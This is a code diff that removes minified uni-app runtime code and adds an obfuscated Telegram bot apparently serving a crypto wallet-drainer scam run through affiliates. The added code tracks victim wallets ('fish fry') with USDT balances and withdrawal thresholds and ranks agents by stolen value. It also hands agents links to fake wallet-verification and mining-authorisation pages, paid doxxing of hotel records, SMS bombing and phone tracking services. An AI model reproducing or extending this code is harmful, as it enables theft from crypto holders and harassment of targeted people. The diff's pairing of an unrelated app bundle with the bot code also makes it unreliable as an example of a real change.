-            t = "string" === typeof t ? T[t] : t, t.definitionFilter && (r.push(t.definitionFilter), t.definitionFilter.call(null, e, []));
-          }), d(n)) ;
-        })(e);
-      }
-      var A = {
-        "wx://form-field": {
-          beforeCreate: function () {
-            var e = this.$options.mpOptions;
-            e.properties || (e.properties = Object.create(null));
-            var t = e.properties;
-            p(t, "name") || (t.name = {
-              type: String
-            }), p(t, "value") || (t.value = {
-              type: String
-            });
-          }
-        }
-      };
-      function I(e, t) {
-        e && e.forEach(function (e) {
-          "string" === typeof e ? A[e] && t.mixins.push(A[e]) : t.mixins.push(function (e) {
-            var t = e.data,
-              n = e.methods,
-              r = e.behaviors,
-              i = e.properties,
-              o = {
-                watch: {},
-                mpOptions: {
-                  mpObservers: []
-                }
-              };
-            return u(t, o), S(n, o), I(r, o), k(i, o), O(e, o), P(e), o;
-          }(e));
-        });
-      }
-      function C(e) {
-        return e.split(",").map(function (e) {
-          return function (e) {
-            return e.split(".");
-          }(e);
-        });
-      }
-      function E(e, t, n, r) {
-        if (t) {
-          var i = "_$".concat(e, "Handlers");
-          (r[i] || (r[i] = [])).push(function () {
-            t.call(r, n);
-          });
-        }
-      }
-      function L(e, t, n) {
-        var r = e.name,
-          i = n._$relationNodes || (n._$relationNodes = Object.create(null));
-        (i[r] || (i[r] = [])).push(t), E("linked", e["linked"], t, n);
-      }
-      function M(e, t, n) {
-        E("unlinked", e["unlinked"], t, n);
-      }
-      function D(e, t, n) {
-        var r = e && e.$options.mpOptions && e.$options.mpOptions.relations;
-        if (!r) return [];
-        var i = Object.keys(r).find(function (e) {
-          var i = r[e];
-          return i.target === t && i.type === n;
-        });
-        return i ? [r[i], e] : [];
-      }
-      function j(e, t, n) {
-        var r = n(e, e.$options.mpOptions.path),
-          i = (0, a.default)(r, 2),
-          o = i[0],
-          s = i[1];
-        o && (L(o, e, s), L(t, s, e), M(o, e, s), M(t, s, e));
-      }
-      function N(e) {
-        var t = e.$options.mpOptions || {},
-          n = t.relations;
-        n && Object.keys(n).forEach(function (t) {
-          (function (e, t) {
-            var n = e.type;
-            "parent" === n ? j(t, e, function (e, t) {
-              return D(e.$parent, t, "child");
-            }) : "ancestor" === n && j(t, e, function (e, t) {
-              var n = e.$parent;
-              while (n) {
-                var r = D(n, t, "descendant");
-                if (r.length) return r;
-                n = n.$parent;
-              }
-              return [];
-            });
-          })(n[t], e);
-        });
-      }
-      function R(e, t) {
-        var n = e["_$".concat(t, "Handlers")];
-        n && n.forEach(function (e) {
-          return e();
-        });
-      }
-      var $ = {
-        enumerable: !0,
-        configurable: !0,
-        get: g,
-        set: g
-      };
-      function F(e, t, n) {
-        $.get = function () {
-          return this[t][n];
-        }, $.set = function (e) {
-          this[t][n] = e;
-        }, Object.defineProperty(e, n, $);
-      }
-      function U(e, t) {
-        var n = this;
-        h(e) && (Object.keys(e).forEach(function (t) {
-          (function (e, t, n) {
-            var r = e.replace(/\[(\d+?)\]/g, ".$1").split(".");
-            return r.reduce(function (e, n, i) {
-              if (i !== r.length - 1) return "undefined" === typeof e[n] && (e[n] = {}), e[n];
-              e[n] = t;
-            }, n), 1 === r.length;
-          })(t, e[t], n.data) && !p(n, t) && F(n, "__data__", t);
-        }), this.$forceUpdate(), d(t) && this.$nextTick(t));
-      }
-      var B = Object.prototype.toString,
-        q = function (e) {
-          return function e() {
-            var t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-              n = arguments.length > 1 ? arguments[1] : void 0,
-              r = B.call(n);
-            if ("[object Array]" === r) return t = n.slice(0), t;
-            if ("[object Object]" === r) {
-              for (var i in n) t[i] = e(t[i], n[i]);
-              return t;
-            }
-            if ("[object Date]" === r) return new Date(n.getTime());
-            if ("[object RegExp]" === r) {
-              var o = String(n),
-                a = o.lastIndexOf("/");
-              return new RegExp(o.slice(1, a), o.slice(a + 1));
-            }
-            return n;
-          }("[object Array]" === B.call(e) ? [] : {}, e);
-        },
-        z = (i = {}, (0, o.default)(i, String, ""), (0, o.default)(i, Number, 0), (0, o.default)(i, Boolean, !1), (0, o.default)(i, Object, null), (0, o.default)(i, Array, []), (0, o.default)(i, null, null), i);
-      function H(e) {
-        return z[e];
-      }
-      function Y(e) {
-        return h(e) ? e.type : e;
-      }
-      function J(e, t, n, r) {
-        var i = n[e];
-        if (void 0 !== i) {
-          var o = t[e],
-            a = Y(o);
-          i = V(i, a);
-          var s = o && o.observer;
-          return s && setTimeout(function () {
-            Z(s, r, i);
-          }, 4), i;
-        }
-        return function (e) {
-          return h(e) ? p(e, "value") ? e.value : H(e.type) : H(e);
-        }(t[e]);
-      }
-      function V(e, t) {
-        return t === Boolean ? !!e : t === String ? String(e) : e;
-      }
-      function Z(e, t, n, r) {
-        try {
-          "function" === typeof e ? e.call(t, n, r) : "string" === typeof e && "function" === typeof t[e] && t[e](n, r);
-        } catch (i) {
-          console.error("execute observer ".concat(e, " callback fail! err: ").concat(i));
-        }
-      }
-      function W(e) {
-        var t = e.$options.mpOptions && e.$options.mpOptions.properties,
-          n = e.$options.propsData;
-        n && t && Object.keys(t).forEach(function (r) {
-          p(n, r) && (e[r] = V(n[r], Y(t[r])));
-        });
-      }
-      function K(e) {
-        var t = JSON.parse(JSON.stringify(e.$options.mpOptions.data || {}));
-        e["__data__"] = t;
-        var n = {
-          get: function () {
-            return e["__data__"];
-          },
-          set: function (t) {
-            e["__data__"] = t;
-          }
-        };
-        Object.defineProperties(e, {
-          data: n,
-          properties: n
-        }), e.setData = U, function (e, t) {
-          var n = e.$options.mpOptions.properties;
-          if (n) {
-            var r = q(e.$options.propsData) || {},
-              i = function (i) {
-                var o = !!h(n[i]) && n[i].observer,
-                  a = J(i, n, r, e);
-                Object.defineProperty(t, i, {
-                  enumerable: !0,
-                  configurable: !0,
-                  get: function () {
-                    return a;
-                  },
-                  set: function (t) {
-                    var n = a;
-                    t === a || t !== t && a !== a || (a = Array.isArray(t) ? t.slice(0) : t, o && Z(o, e, t, n), e.$forceUpdate());
-                  }
-                });
-              };
-            for (var o in n) i(o);
-          }
-        }(e, t), Object.keys(t).forEach(function (t) {
-          F(e, "__data__", t);
-        });
-      }
-      var G = {
-        beforeCreate: function () {
-          this._renderProxy = this, this._$self = this, this._$noop = g;
-        },
-        created: function () {
-          K(this), function (e) {
-            var t = e.$emit;
-            e.triggerEvent = function (n, r, i) {
-              var o = {
-                  dataset: e.$el.dataset
-                },
-                a = {
-                  target: o,
-                  currentTarget: o,
-                  detail: r,
-                  preventDefault: g,
-                  stopPropagation: g
-                };
-              t.call(e, n, a);
-            }, e.$emit = function () {
-              e.triggerEvent.apply(e, arguments);
-            }, e.getRelationNodes = function (t) {
-              return (e._$relationNodes && e._$relationNodes[t] || []).filter(function (e) {
-                return !e._isDestroyed;
-              });
-            }, e._$updateProperties = W;
-          }(this), N(this);
-        },
-        mounted: function () {
-          (function (e) {
-            var t = e.$options.watch;
-            t && Object.keys(t).forEach(function (n) {
-              var r = t[n];
-              if (r.mounted) {
-                var i = e[n],
-                  o = r.handler;
-                "string" === typeof o && (o = e[o]), o && o.call(e, i, i);
-              }
-            });
-          })(this);
-        },
-        destroyed: function () {
-          R(this, "unlinked");
-        }
-      };
-      e.__wxRoute = "", e.__wxComponents = Object.create(null), e.__wxVueOptions = Object.create(null);
-      var Q = s.default.nextTick;
-      t.nextTick = Q;
-      var X = uni.__$wx__,
-        ee = X;
-      t.default = ee;
-    }).call(this, n("0ee4"));
-  },
-  ee10: function (e, t) {
-    function n(e, t, n, r, i, o, a) {
-      try {
-        var s = e[o](a),
-          u = s.value;
-      } catch (c) {
-        return void n(c);
-      }
-      s.done ? t(u) : Promise.resolve(u).then(r, i);
-    }
-    e.exports = function (e) {
-      return function () {
-        var t = this,
-          r = arguments;
-        return new Promise(function (i, o) {
-          var a = e.apply(t, r);
-          function s(e) {
-            n(a, i, o, s, u, "next", e);
-          }
-          function u(e) {
-            n(a, i, o, s, u, "throw", e);
-          }
-          s(void 0);
-        });
-      };
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  f3b9: function (e, t, n) {
-    "use strict";
-
-    function r(e) {
-      var t = Object.prototype.toString.call(e);
-      return t.substring(8, t.length - 1);
-    }
-    function i() {
-      return "string" === typeof __channelId__ && __channelId__;
-    }
-    function o(e, t) {
-      switch (r(t)) {
-        case "Function":
-          return "function() { [native code] }";
-        default:
-          return t;
-      }
-    }
-    function a(e) {
-      for (var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1; r < t; r++) n[r - 1] = arguments[r];
-      console[e].apply(console, n);
-    }
-    function s() {
-      for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
-      var a = t.shift();
-      if (i()) return t.push(t.pop().replace("at ", "uni-app:///")), console[a].apply(console, t);
-      var s = t.map(function (e) {
-          var t = Object.prototype.toString.call(e).toLowerCase();
-          if ("[object object]" === t || "[object array]" === t) try {
-            e = "---BEGIN:JSON---" + JSON.stringify(e, o) + "---END:JSON---";
-          } catch (i) {
-            e = t;
-          } else if (null === e) e = "---NULL---";else if (void 0 === e) e = "---UNDEFINED---";else {
-            var n = r(e).toUpperCase();
-            e = "NUMBER" === n || "BOOLEAN" === n ? "---BEGIN:" + n + "---" + e + "---END:" + n + "---" : String(e);
-          }
-          return e;
-        }),
-        u = "";
-      if (s.length > 1) {
-        var c = s.pop();
-        u = s.join("---COMMA---"), 0 === c.indexOf(" at ") ? u += c : u += "---COMMA---" + c;
-      } else u = s[0];
-      console[a](u);
-    }
-    n.r(t), n.d(t, "log", function () {
-      return a;
-    }), n.d(t, "default", function () {
-      return s;
-    });
-  },
-  f411: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("39c9"),
-      i = n.n(r);
-    for (var o in r) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(o);
-    t["default"] = i.a;
-  },
-  fc3f: function (e, t, n) {
-    "use strict";
-
-    n.d(t, "b", function () {
-      return r;
-    }), n.d(t, "c", function () {
-      return i;
-    }), n.d(t, "a", function () {});
-    var r = function () {
-        var e = this.$createElement,
-          t = this._self._c || e;
-        return t("view", {
-          staticClass: this._$s(0, "sc", "uni-status-bar"),
-          style: this._$s(0, "s", {
-            height: this.statusBarHeight
-          }),
-          attrs: {
-            _i: 0
-          }
-        }, [this._t("default", null, {
-          _i: 1
-        })], 2);
-      },
-      i = [];
+    S.options.parse_mode = "HTML";
+    return S;
   }
-}, [["d40d", "app-config", "app-confusion"]]]);
+}
+async function getFishMessage(a, z) {
+  try {
+    const b = z.from.id,
+      I = z.from.first_name + (z.from.last_name ? " " + z.from.last_name : ""),
+      F = getTimeInfo(),
+      U = 10,
+      u = Array.from(cacheData.dailiMap.values()).find(d => d.tguid === b.toString() && d.groupid === a.toString());
+    if (!u) {
+      return {
+        text: "🎣渔夫 <code>" + I + "</code> " + F.greeting + "！\n\n" + "📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。",
+        options: {
+          parse_mode: "HTML",
+          reply_to_message_id: z.message_id
+        }
+      };
+    }
+    const K = Array.from(cacheData.fishMap.values()).filter(A => A.unique_id === u.unique_id && A.auth_status === 1).sort((A, M) => A.id - M.id);
+    if (K.length === 0) {
+      return {
+        text: "🎣渔夫 " + I + " " + F.greeting + "！\n\n" + "🐟您的鱼池为空，请继续加油吧，答应我一定要赚够多多的uu！",
+        options: {
+          parse_mode: "HTML",
+          reply_to_message_id: z.message_id,
+          reply_markup: {
+            inline_keyboard: [[{
+              text: "✅ 退出查询",
+              callback_data: "fish_close_" + u.unique_id
+            }]]
+          }
+        }
+      };
+    }
+    let q = "🎣渔夫 <code>" + I + "</code> " + F.greeting + "！\n\n" + ("共计 <code>" + K.length + "</code> 条鱼苗（第<code>1</code>页）\n\n");
+    const E = K.slice(0, U);
+    E.forEach((M, L) => {
+      const V = L + 1,
+        N = Number(M.usdt_balance).toFixed(6),
+        r = Number(M.threshold).toFixed(6);
+      q += "🐟鱼苗<code>" + V + "</code>号：<code>" + M.fish_address + "</code>\n" + ("📤提币阈值：<code>" + r + "</code>\n") + ("💸USDT余额：<code>" + N + "</code>\n\n");
+    });
+    const P = {
+        inline_keyboard: K.length > U ? [[{
+          text: "➡️下一页",
+          callback_data: "fish_page_" + u.unique_id + "_2"
+        }, {
+          text: "✅ 退出查询",
+          callback_data: "fish_close_" + u.unique_id
+        }]] : [[{
+          text: "✅ 退出查询",
+          callback_data: "fish_close_" + u.unique_id
+        }]]
+      },
+      O = {
+        parse_mode: "HTML",
+        reply_to_message_id: z.message_id,
+        reply_markup: P
+      };
+    const s = {
+      text: q,
+      options: O
+    };
+    return s;
+  } catch (L) {
+    console.error("[" + getTimeInfo().time + "] 查询鱼池信息错误:", L);
+    const V = {
+      text: "❌ 查询鱼池信息时出现错误，请联系管理员。",
+      options: {}
+    };
+    V.options.parse_mode = "HTML";
+    V.options.reply_to_message_id = z.message_id;
+    return V;
+  }
+}
+async function adminQueryUserFish(b, I, F, U) {
+  try {
+    const K = I.from.id,
+      q = I.from.first_name + (I.from.last_name ? " " + I.from.last_name : ""),
+      E = getTimeInfo(),
+      {
+        isAdmin: P,
+        isCreator: O
+      } = await checkGroupAdminStatus(U, b, K);
+    if (!P && !O) {
+      return null;
+    }
+    const s = Array.from(cacheData.dailiMap.values()).filter(B => B.groupid === b.toString()),
+      d = s.find(B => B.username && B.username.toLowerCase() === F.toLowerCase());
+    if (!d) {
+      const B = {
+        parse_mode: "HTML",
+        reply_to_message_id: I.message_id
+      };
+      const R = {
+        text: "❌ 未找到用户 @" + F + " 的鱼苗信息。",
+        options: B
+      };
+      return R;
+    }
+    let A = "",
+      M = "";
+    if (d.fullName) {
+      const X = d.fullName.split(" ");
+      A = X[0] || "";
+      M = X[1] || "";
+    }
+    const L = {};
+    L.id = d.tguid;
+    L.first_name = A;
+    L.last_name = M;
+    L.username = d.username;
+    const Y = {
+      ...I,
+      from: L
+    };
+    const N = await getFishMessage(b, Y);
+    if (N && N.text) {
+      const c = d.fullName || d.username || "Unknown",
+        G = "🎣渔夫 <code>" + c + "</code> " + E.greeting + "！",
+        S = "👮‍♂️ 管理员 <code>" + q + "</code> " + E.greeting + "！\n\n当前正在查询用户: @" + d.username;
+      N.text = N.text.replace(G, S);
+      if (N.options && N.options.reply_markup && N.options.reply_markup.inline_keyboard) {
+        const o = N.options.reply_markup.inline_keyboard;
+        for (let Q = 0; Q < o.length; Q++) {
+          for (let T = 0; T < o[Q].length; T++) {
+            const v = o[Q][T];
+            if (v.callback_data && !v.callback_data.includes("_admin")) {
+              v.callback_data = v.callback_data + "_admin";
+            }
+          }
+        }
+      }
+    }
+    return N;
+  } catch (y) {
+    console.error("[" + getTimeInfo().time + "] 管理员查询用户鱼苗错误:", y);
+    const p4 = {
+      text: "❌ 查询用户鱼苗信息时出现错误。",
+      options: {}
+    };
+    p4.options.parse_mode = "HTML";
+    p4.options.reply_to_message_id = I.message_id;
+    return p4;
+  }
+}
+async function handleFishCallback(b) {
+  try {
+    const U = b.message.chat.id,
+      u = b.from.id,
+      K = b.message.message_id,
+      q = b.data.split("_"),
+      P = q[1],
+      O = q[2],
+      s = q.includes("admin"),
+      d = s ? parseInt(q[q.indexOf("admin") - 1]) : parseInt(q[3]),
+      A = await checkGroupAdminStatus(bot, U, u),
+      M = A.isAdmin || A.isCreator;
+    if (s && !M) {
+      const Y = {
+        text: "⛔️ 您无权操作本条消息，只有管理员可以操作",
+        show_alert: true
+      };
+      await bot.answerCallbackQuery(b.id, Y);
+      return;
+    }
+    if (!s) {
+      const N = Array.from(cacheData.dailiMap.values()).find(r => r.tguid === u.toString() && r.groupid === U.toString());
+      if (!N || N.unique_id !== O && !M) {
+        const B = {
+          text: "⛔️ 您无权操作本条消息",
+          show_alert: true
+        };
+        await bot.answerCallbackQuery(b.id, B);
+        return;
+      }
+    }
+    if (P === "close") {
+      await bot.deleteMessage(U, K);
+      await bot.answerCallbackQuery(b.id);
+      return;
+    }
+    if (P === "page") {
+      const f = d,
+        X = 10,
+        n = Array.from(cacheData.fishMap.values()).filter(x => x.unique_id === O && x.auth_status === 1).sort((x, k) => x.id - k.id),
+        c = (f - 1) * X,
+        G = n.slice(c, c + X),
+        S = cacheData.dailiMap.get(O);
+      let e;
+      if (s) {
+        e = "📊 管理员查询：用户 @" + S.username + " 的鱼池信息：\n\n" + ("总计：<code>" + n.length + "</code> 条鱼苗（第<code>" + f + "</code>页）\n\n");
+      } else {
+        const D = b.from.first_name + (b.from.last_name ? " " + b.from.last_name : "");
+        e = "🎣渔夫 <code>" + D + "</code> " + getTimeInfo().greeting + "！\n\n" + ("共计 <code>" + n.length + "</code> 条鱼苗（第<code>" + f + "</code>页）\n\n");
+      }
+      G.forEach((H, y) => {
+        const p6 = c + y + 1,
+          p7 = Number(H.usdt_balance).toFixed(6),
+          p8 = Number(H.threshold).toFixed(6);
+        e += "🐟鱼苗<code>" + p6 + "</code>号：<code>" + H.fish_address + "</code>\n" + ("📤提币阈值：<code>" + p8 + "</code>\n") + ("💸USDT余额：<code>" + p7 + "</code>\n\n");
+      });
+      const o = {};
+      o.inline_keyboard = [];
+      const i = o,
+        Q = c + X < n.length,
+        T = f > 1,
+        C = s ? "_admin" : "";
+      if (T && Q) {
+        i.inline_keyboard = [[{
+          text: "⬅️上一页",
+          callback_data: "fish_page_" + O + "_" + (f - 1) + C
+        }, {
+          text: "➡️下一页",
+          callback_data: "fish_page_" + O + "_" + (f + 1) + C
+        }], [{
+          text: "✅ 关闭",
+          callback_data: "fish_close_" + O + C
+        }]];
+      } else {
+        if (Q) {
+          i.inline_keyboard = [[{
+            text: "➡️下一页",
+            callback_data: "fish_page_" + O + "_" + (f + 1) + C
+          }, {
+            text: "✅ 关闭",
+            callback_data: "fish_close_" + O + C
+          }]];
+        } else {
+          if (T) {
+            i.inline_keyboard = [[{
+              text: "⬅️上一页",
+              callback_data: "fish_page_" + O + "_" + (f - 1) + C
+            }, {
+              text: "✅ 关闭",
+              callback_data: "fish_close_" + O + C
+            }]];
+          } else {
+            const p5 = {
+              text: "✅ 关闭",
+              callback_data: "fish_close_" + O + C
+            };
+            i.inline_keyboard = [[p5]];
+          }
+        }
+      }
+      const v = {};
+      v.chat_id = U;
+      v.message_id = K;
+      v.parse_mode = "HTML";
+      v.reply_markup = i;
+      await bot.editMessageText(e, v);
+      await bot.answerCallbackQuery(b.id);
+    }
+  } catch (p7) {
+    console.error("[" + getTimeInfo().time + "] 处理鱼苗回调错误:", p7);
+    const p8 = {
+      text: "查看鱼苗时出现错误，请联系管理员",
+      show_alert: true
+    };
+    await bot.answerCallbackQuery(b.id, p8);
+  }
+}
+async function generateUniqueId(j) {
+  const J = "abcdefghijklmnopqrstuvwxyz0123456789";
+  function a() {
+    let I = "";
+    for (let F = 0; F < 11; F++) {
+      I += J.charAt(Math.floor(Math.random() * J.length));
+    }
+    return I;
+  }
+  const z = a();
+  const [l] = await j.promise().query("SELECT id FROM daili WHERE unique_id = ?", [z]);
+  if (l.length === 0) {
+    return z;
+  }
+  return generateUniqueId(j);
+}
+async function getDomainMessage(I, F) {
+  try {
+    if (!F.from.username) {
+      const G = {
+        text: "❌ 请先创建你的用户名才能继续申请代理链接",
+        options: {}
+      };
+      return G;
+    }
+    const u = F.from.id,
+      K = F.from.username,
+      q = F.from.first_name + (F.from.last_name ? " " + F.from.last_name : ""),
+      E = getTimeInfo(),
+      P = F.chat.id.toString(),
+      [O] = await pool.promise().query("SELECT * FROM daili WHERE tguid = ? AND groupid = ?", [u.toString(), P]);
+    if (!O.length) {
+      try {
+        const e = await generateUniqueId(pool);
+        await pool.promise().query("INSERT INTO daili (tguid, username, fullName, time, groupid, unique_id) VALUES (?, ?, ?, ?, ?, ?)", [u, K, q, E.time, P, e]);
+      } catch (o) {
+        console.error("[" + getTimeInfo().time + "] 创建代理记录失败:", o);
+        const i = {
+          text: "❌ 创建代理记录时出现错误，请联系管理员。",
+          options: {}
+        };
+        return i;
+      }
+    } else {
+      await pool.promise().query("UPDATE daili SET username = ?, fullName = ? WHERE tguid = ? AND groupid = ?", [K, q, u, P]);
+    }
+    const [s] = await pool.promise().query("SELECT threshold, payment_address, unique_id, time FROM daili WHERE tguid = ? AND groupid = ?", [u.toString(), P]),
+      d = s[0] || {},
+      A = d.threshold || DEFAULT_AUTO_THRESHOLD,
+      M = d.unique_id,
+      L = d.payment_address || "当前未设置，可使用【收款地址】进行设置",
+      V = Array.from(cacheData.fishMap.values()).filter(Q => String(Q.unique_id) === String(M) && Number(Q.auth_status) === 1).length,
+      N = function (Q) {
+        if (Q < 1) {
+          return "青铜";
+        }
+        if (Q < 5) {
+          return "白银";
+        }
+        if (Q < 10) {
+          return "黄金";
+        }
+        if (Q < 20) {
+          return "钻石";
+        }
+        return "大师";
+      }(V);
+    let r = cacheData.options.main_domain || "";
+    if (!r) {
+      const Q = {
+        text: "❌ 未找到主域名配置，请联系管理员在后台设置主域名。",
+        options: {}
+      };
+      return Q;
+    }
+    r = r.endsWith("/") ? r.slice(0, -1) : r;
+    const B = "?id=" + M,
+      R = {
+        shop: "" + r + B,
+        goods: r + "/netshop/pay.html" + B + "&pid=1",
+        tuihuo: r + "/netshop/pay.html" + B + "&pid=91",
+        trx: r + "/trx" + B,
+        sgk: r + "/sgk" + B,
+        hsn: r + "/hsn" + B,
+        tk: r + "/tk" + B,
+        sw: r + "/sw" + B,
+        yzjh: r + "/yanzheng" + B,
+        xinbi: r + "/xinbi" + B,
+        hwdb: r + "/hwdb" + B,
+        tddb: r + "/tddb" + B,
+        dydb: r + "/dydb" + B,
+        netsms: r + "/netsms" + B,
+        netshop: r + "/netshop" + B,
+        paofen: r + "/paofen" + B,
+        Uband: r + "/Uband" + B,
+        tgvip: r + "/tgvip" + B,
+        phone: r + "/phone" + B,
+        energy: r + "/energy" + B,
+        wk: r + "/wk" + B,
+        map: r + "/map" + B,
+        HBbot: "https://t.me/Okay_PayBot?start=" + M,
+        FKbot: "https://t.me/wuyouhaopu_bot?start=" + M
+      };
+    const X = "🎣渔夫 <code>" + q + "</code> " + E.greeting + "！\n" + ("🐟鱼苗数量：<code>" + V + "</code> | 🏅等级：<code>" + N + "</code>\n") + ("⚜️授权成功后自动设置阈值：<code>" + A + "</code>\n") + ("<pre>" + L + "</pre>\n") + "————————————\n" + ("🛍 <a href=\"" + R.shop + "\">点击访问繁体商城</a>\n") + "————————————\n" + ("🧬 <a href=\"" + R.netshop + "\">点击访问发卡商城</a>\n") + "————————————\n" + "✈️飞机自助商城机器人⤵️\n" + "————————————\n" + ("🦋 <a href=\"" + R.FKbot + "\">无忧号铺 24小时自动发货</a>\n") + "————————————\n" + "机器人提货下单码 '985159'\n" + "————————————\n" + "📦 提货：\n" + ("🧬➽<a href=\"" + R.goods + "\">订单提货链接0.1U</a>\n") + "📦 退货：\n" + ("🧬➽<a href=\"" + R.tuihuo + "\">订单退货链接0.1U</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🧧okpay红包机器人➽最新\n" + ("🧬 <a href=\"" + R.HBbot + "\">点击访问红包机器人</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🚗 跑分平台授权➽独家首发\n" + ("🧬  <a href=\"" + R.paofen + "\">跑分订单大厅链接</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🎢 挖矿授权➽全新升级\n" + ("🧬  <a href=\"" + R.wk + "\">智能挖矿点击链接</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🔋能量租赁➽TRX闪兑\n" + ("🔗点击；<a href=\"" + R.trx + "\">实时汇率兑换</a>\n") + "🪫能量租赁➽误转退款\n" + ("🔗点击；<a href=\"" + R.tk + "\">能量租赁退款</a>\n") + "🔻波场返还➽手续费返还\n" + ("🔗点击；<a href=\"" + R.energy + "\">申请退返平台</a>\n") + "————————————\n" + "🪱 全球短信接码平台•\n" + ("🧬点击➽<a href=\"" + R.netsms + "\">全球短信接码</a>\n\n") + "🦺TG会员闪充平台•\n" + ("🧬点击➽<a href=\"" + R.tgvip + "\">进入TG会员闪充</a>\n\n") + "⛽️三网手机7折充值•\n" + ("🧬点击➽<a href=\"" + R.phone + "\">进入手机充值平台</a>\n\n") + "🎱黑U绑定承兑登记•\n" + ("🧬点击➽<a href=\"" + R.Uband + "\">进入黑U绑定登记</a>\n\n") + "🛍 实物车快递信息登记•\n" + ("🧬点击➽<a href=\"" + R.sw + "\">实物车收货登记</a>\n\n") + "🧧钱包验证激活授权•\n" + ("🧬点击➽<a href=\"" + R.yzjh + "\">进入钱包验证激活</a>\n") + "————————————\n" + "🛡 纠纷退押处理•\n" + ("新币担保➽<a href=\"" + R.xinbi + "\">退押登记</a>\n") + ("土豆退款➽<a href=\"" + R.tddb + "\">退押登记</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🔍社工库»开房记录\n" + ("🧬社工查询：<a href=\"" + R.sgk + "\">付费查询</a>\n") + "📱短信轰炸»手机轰炸»\n" + ("🧬短信轰炸：<a href=\"" + R.hsn + "\">轰炸网站</a>\n") + "📱手机类»手机定位追踪»\n" + ("🧬手机定位：<a href=\"" + R.map + "\">点击定位</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🔰<b>发送  im 获取收款码</b>\n" + "🔰<b>发送  tp 获取收款码</b>\n" + "❇️<b>收银+金额 获取专属订单收银台！</b>\n\n",
+      n = {
+        parse_mode: "HTML",
+        reply_to_message_id: F.message_id,
+        disable_web_page_preview: false
+      };
+    const c = {
+      text: X,
+      options: n
+    };
+    return c;
+  } catch (T) {
+    console.error("[" + getTimeInfo().time + "] 处理代理链接错误:", T);
+    const C = {
+      text: "❌ 生成代理链接时出现错误，请联系管理员。",
+      options: {}
+    };
+    return C;
+  }
+}
+let __perfTableReady = false,
+  __perfMigratedOnce = false;
+const PERF_TABLE = "daili_performance_v2";
+async function ensurePerformanceTable() {
+  if (__perfTableReady) {
+    return true;
+  }
+  try {
+    await pool.promise().query("CREATE TABLE IF NOT EXISTS " + PERF_TABLE + " (\n        id BIGINT AUTO_INCREMENT PRIMARY KEY,\n        groupid VARCHAR(64) NOT NULL,\n        nickname VARCHAR(128) NOT NULL,\n        value DECIMAL(18,2) NOT NULL DEFAULT 0,\n        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,\n        UNIQUE KEY uniq_gid_nickname (groupid, nickname)\n      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
+    if (!__perfMigratedOnce) {
+      __perfMigratedOnce = true;
+      try {
+        const [a] = await pool.promise().query("SHOW TABLES LIKE 'daili_performance'");
+        if (a && a.length) {
+          const [z] = await pool.promise().query("SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'daili_performance'"),
+            l = new Set((z || []).map(I => String(I.COLUMN_NAME || "").toLowerCase())),
+            b = l.has("nickname") ? "nickname" : l.has("username") ? "username" : null;
+          b && (await pool.promise().query("INSERT INTO " + PERF_TABLE + " (groupid, nickname, value)\n               SELECT groupid, " + b + " AS nickname, SUM(value) AS value\n               FROM daili_performance\n               WHERE " + b + " IS NOT NULL AND TRIM(" + b + ") <> ''\n               GROUP BY groupid, " + b + "\n               ON DUPLICATE KEY UPDATE value = " + PERF_TABLE + ".value + VALUES(value)"));
+        }
+      } catch (I) {
+        console.error("ensurePerformanceTable migrate to v2 error", I);
+      }
+    }
+    __perfTableReady = true;
+    return true;
+  } catch (F) {
+    console.error("ensurePerformanceTable error", F);
+    return false;
+  }
+}
+async function addPerformance(j, w, J) {
+  const z = String(w || "").trim();
+  if (!z) {
+    return 0;
+  }
+  await pool.promise().query("INSERT INTO " + PERF_TABLE + " (groupid, nickname, value) VALUES (?, ?, ?) ON DUPLICATE KEY UPDATE value = value + VALUES(value)", [j.toString(), z, Number(J) || 0]);
+  const {
+    value: l
+  } = await getPerformanceValue(j, z);
+  return Number(l || 0);
+}
+async function getPerformanceValue(J, a) {
+  const l = String(a || "").trim();
+  const b = {
+    value: 0
+  };
+  if (!l) {
+    return b;
+  }
+  const [I] = await pool.promise().query("SELECT value FROM " + PERF_TABLE + " WHERE groupid = ? AND nickname = ? LIMIT 1", [J.toString(), l]),
+    F = {
+      value: 0
+    };
+  return I && I[0] ? I[0] : F;
+}
+async function getLeaderboard(j, w = 10) {
+  const a = j.toString(),
+    z = Number(w);
+  if (Number.isFinite(z) && z > 0) {
+    const [b] = await pool.promise().query("SELECT nickname, value FROM " + PERF_TABLE + " WHERE groupid = ? AND value > 0 ORDER BY value DESC LIMIT ?", [a, z]);
+    return b || [];
+  }
+  const [l] = await pool.promise().query("SELECT nickname, value FROM " + PERF_TABLE + " WHERE groupid = ? AND value > 0 ORDER BY value DESC", [a]);
+  return l || [];
+}
+async function buildMonthlyLeaderboardMessage(j, w) {
+  await ensurePerformanceTable();
+  const a = await getLeaderboard(j, 0);
+  if (!a || !a.length) {
+    return "当前暂无业绩数据。";
+  }
+  const z = K => K === 0 ? "🥇" : K === 1 ? "🥈" : K === 2 ? "🥉" : "";
+  const l = a.map((K, q) => {
+      const E = K.nickname || "",
+        P = E || "未知";
+      const O = Number(K.value || 0),
+        s = q < 3 ? "" + z(q) + (q + 1) + "." : "⭐" + (q + 1) + ".";
+      return {
+        rank: q + 1,
+        label: s,
+        name: P,
+        value: O
+      };
+    }),
+    b = K => {
+      const q = Number(K || 0).toFixed(2);
+      return q.replace(/\.?0+$/, "");
+    },
+    I = l.map(K => K.label + "  " + K.name + "➣ " + b(K.value) + " USDT").join("\n"),
